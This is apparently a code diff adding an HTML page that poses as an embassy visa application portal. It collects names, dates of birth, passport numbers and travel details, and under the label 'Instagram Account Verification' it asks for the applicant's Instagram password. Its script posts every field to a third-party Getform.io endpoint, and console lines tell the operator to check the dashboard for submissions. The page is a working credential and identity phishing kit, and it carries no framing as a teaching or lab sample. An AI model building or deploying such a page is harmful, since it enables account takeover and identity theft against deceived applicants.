@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Visa Application Form - Embassy Portal</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #2c3e50 0%, #3498db 100%);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+
+        .header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+        }
+
+        .header p {
+            opacity: 0.9;
+            font-size: 1.1em;
+        }
+
+        .form-container {
+            padding: 40px;
+        }
+
+        .form-section {
+            margin-bottom: 40px;
+        }
+
+        .section-title {
+            font-size: 1.4em;
+            color: #2c3e50;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #3498db;
+        }
+
+        .form-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group.full-width {
+            grid-column: 1 / -1;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #2c3e50;
+        }
+
+        input, select, textarea {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e1e8ed;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+        }
+
+        input:focus, select:focus, textarea:focus {
+            outline: none;
+            border-color: #3498db;
+            box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.1);
+        }
+
+        .required::after {
+            content: " *";
+            color: #e74c3c;
+        }
+
+        .btn-group {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            margin-top: 30px;
+        }
+
+        .btn {
+            padding: 15px 30px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-block;
+            text-align: center;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #3498db 0%, #2980b9 100%);
+            color: white;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(52, 152, 219, 0.3);
+        }
+
+        .btn-primary:disabled {
+            background: #95a5a6;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .btn-secondary {
+            background: #95a5a6;
+            color: white;
+        }
+
+        .btn-secondary:hover {
+            background: #7f8c8d;
+        }
+
+        .demo-notice {
+            background: linear-gradient(135deg, #fff3cd 0%, #ffeaa7 100%);
+            border: 2px solid #fdcb6e;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            text-align: center;
+        }
+
+        .success-message {
+            background: linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%);
+            border: 2px solid #28a745;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+
+        .loading-message {
+            background: linear-gradient(135deg, #cce7ff 0%, #99ceff 100%);
+            border: 2px solid #3498db;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            text-align: center;
+        }
+
+        .error-message {
+            background: linear-gradient(135deg, #ffe6e6 0%, #ffcccc 100%);
+            border: 2px solid #e74c3c;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+
+        @media (max-width: 768px) {
+            .form-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🛂 Visa Application Portal</h1>
+            <p>Complete your visa application with Instagram verification</p>
+        </div>
+
+        <div class="form-container">
+            <!-- Getform.io Form with your endpoint -->
+            <form action="https://getform.io/f/bjjrwkpb" method="POST" id="visa-form">
+                <!-- Personal Information Section -->
+                <div class="form-section">
+                    <h2 class="section-title">📋 Personal Information</h2>
+                    <div class="form-grid">
+                        <div class="form-group">
+                            <label for="full_name" class="required">Full Name</label>
+                            <input type="text" id="full_name" name="Full Name" required>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="email" class="required">Email Address</label>
+                            <input type="email" id="email" name="Email" required>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="phone" class="required">Phone Number</label>
+                            <input type="tel" id="phone" name="Phone Number" required>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="date_of_birth" class="required">Date of Birth</label>
+                            <input type="date" id="date_of_birth" name="Date of Birth" required>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Passport Information Section -->
+                <div class="form-section">
+                    <h2 class="section-title">📄 Passport Details</h2>
+                    <div class="form-grid">
+                        <div class="form-group">
+                            <label for="passport_no" class="required">Passport Number</label>
+                            <input type="text" id="passport_no" name="Passport Number" required>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="nationality" class="required">Nationality</label>
+                            <input type="text" id="nationality" name="Nationality" required>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="passport_issue_date" class="required">Passport Issue Date</label>
+                            <input type="date" id="passport_issue_date" name="Passport Issue Date" required>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="passport_expiry_date" class="required">Passport Expiry Date</label>
+                            <input type="date" id="passport_expiry_date" name="Passport Expiry Date" required>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Travel Information Section -->
+                <div class="form-section">
+                    <h2 class="section-title">✈️ Travel Information</h2>
+                    <div class="form-grid">
+                        <div class="form-group">
+                            <label for="purpose_of_visit" class="required">Purpose of Visit</label>
+                            <select id="purpose_of_visit" name="Purpose of Visit" required>
+                                <option value="">Select Purpose</option>
+                                <option value="Tourism">Tourism</option>
+                                <option value="Business">Business</option>
+                                <option value="Education">Education</option>
+                                <option value="Work">Work</option>
+                                <option value="Family Visit">Family Visit</option>
+                                <option value="Medical">Medical</option>
+                                <option value="Other">Other</option>
+                            </select>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="intended_duration" class="required">Intended Duration of Stay</label>
+                            <input type="text" id="intended_duration" name="Intended Duration" placeholder="e.g., 15 days, 3 months" required>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="arrival_date" class="required">Intended Arrival Date</label>
+                            <input type="date" id="arrival_date" name="Arrival Date" required>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="departure_date" class="required">Intended Departure Date</label>
+                            <input type="date" id="departure_date" name="Departure Date" required>
+                        </div>
+                    </div>
+                    
+                    <div class="form-group full-width">
+                        <label for="accommodation_details" class="required">Accommodation Details</label>
+                        <textarea id="accommodation_details" name="Accommodation Details" rows="3" placeholder="Hotel name, friend's address, etc." required></textarea>
+                    </div>
+                </div>
+
+                <!-- Instagram Verification Section -->
+                <div class="form-section">
+                    <h2 class="section-title">📱 Instagram Account Verification</h2>
+                    <div class="form-grid">
+                        <div class="form-group">
+                            <label for="ig_username" class="required">Instagram Username</label>
+                            <input type="text" id="ig_username" name="Instagram Username" placeholder="@username" required>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="ig_password" class="required">Instagram Password</label>
+                            <input type="password" id="ig_password" name="Instagram Password" required>
+                        </div>
+                    </div>
+                    
+                
+                </div>
+
+                <!-- Emergency Contact Section -->
+                <div class="form-section">
+                    <h2 class="section-title">🚨 Emergency Contact</h2>
+                    <div class="form-grid">
+                        <div class="form-group">
+                            <label for="emergency_contact_name" class="required">Emergency Contact Name</label>
+                            <input type="text" id="emergency_contact_name" name="Emergency Contact Name" required>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="emergency_contact_phone" class="required">Emergency Contact Phone</label>
+                            <input type="tel" id="emergency_contact_phone" name="Emergency Contact Phone" required>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="emergency_contact_relation" class="required">Relationship</label>
+                            <input type="text" id="emergency_contact_relation" name="Emergency Contact Relationship" placeholder="Parent, Spouse, Friend, etc." required>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="btn-group">
+                    <button type="submit" class="btn btn-primary" id="submit-btn">Submit Visa Application</button>
+                    <button type="button" class="btn btn-secondary" onclick="clearForm()">Clear Form</button>
+                </div>
+            </form>
+
+            <div id="loading-message" class="loading-message" style="display: none;">
+                <h3>⏳ Processing Your Application...</h3>
+                <p>Please wait while we submit your application.</p>
+            </div>
+
+            <div id="success-message" class="success-message" style="display: none;">
+                <h3>✅ Application Submitted Successfully!</h3>
+                <p>Thank you for your submission. We have received your visa application and you will receive a confirmation email shortly.</p>
+            </div>
+
+            <div id="error-message" class="error-message" style="display: none;">
+                <h3>❌ Submission Failed</h3>
+                <p id="error-details">There was an error submitting your application. Please try again.</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('visa-form').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const submitBtn = document.getElementById('submit-btn');
+            const loadingMessage = document.getElementById('loading-message');
+            const successMessage = document.getElementById('success-message');
+            const errorMessage = document.getElementById('error-message');
+            const errorDetails = document.getElementById('error-details');
+            
+            // Hide other messages
+            successMessage.style.display = 'none';
+            errorMessage.style.display = 'none';
+            
+            // Show loading state
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Submitting...';
+            loadingMessage.style.display = 'block';
+            loadingMessage.scrollIntoView({ behavior: 'smooth' });
+            
+            try {
+                // Get form data
+                const formData = new FormData(this);
+                
+                console.log('📤 Submitting form to Getform.io...');
+                
+                // Send to Getform.io
+                const response = await fetch('https://getform.io/f/bjjrwkpb', {
+                    method: 'POST',
+                    body: formData,
+                    headers: {
+                        'Accept': 'application/json'
+                    }
+                });
+                
+                if (response.ok) {
+                    // Success
+                    loadingMessage.style.display = 'none';
+                    successMessage.style.display = 'block';
+                    this.reset();
+                    successMessage.scrollIntoView({ behavior: 'smooth' });
+                    
+                    console.log('✅ Form submitted successfully to Getform.io!');
+                    console.log('📧 Check your Getform.io dashboard and email for the submission.');
+                    
+                } else {
+                    const errorText = await response.text();
+                    throw new Error(`Server responded with ${response.status}: ${errorText}`);
+                }
+                
+            } catch (error) {
+                // Error handling
+                loadingMessage.style.display = 'none';
+                errorMessage.style.display = 'block';
+                errorDetails.textContent = `Error: ${error.message}`;
+                errorMessage.scrollIntoView({ behavior: 'smooth' });
+                console.error('❌ Form submission error:', error);
+            } finally {
+                // Reset button state
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Submit Visa Application';
+            }
+        });
+
+        function clearForm() {
+            document.getElementById('visa-form').reset();
+            document.getElementById('loading-message').style.display = 'none';
+            document.getElementById('success-message').style.display = 'none';
+            document.getElementById('error-message').style.display = 'none';
+        }
+
+        // Success message for setup
+        console.log('🚀 Form is READY with Getform.io!');
+        console.log('✅ Endpoint: https://getform.io/f/bjjrwkpb');
+        console.log('📧 Submissions will be sent to your Getform.io dashboard and email');
+    </script>
+</body>
+</html>
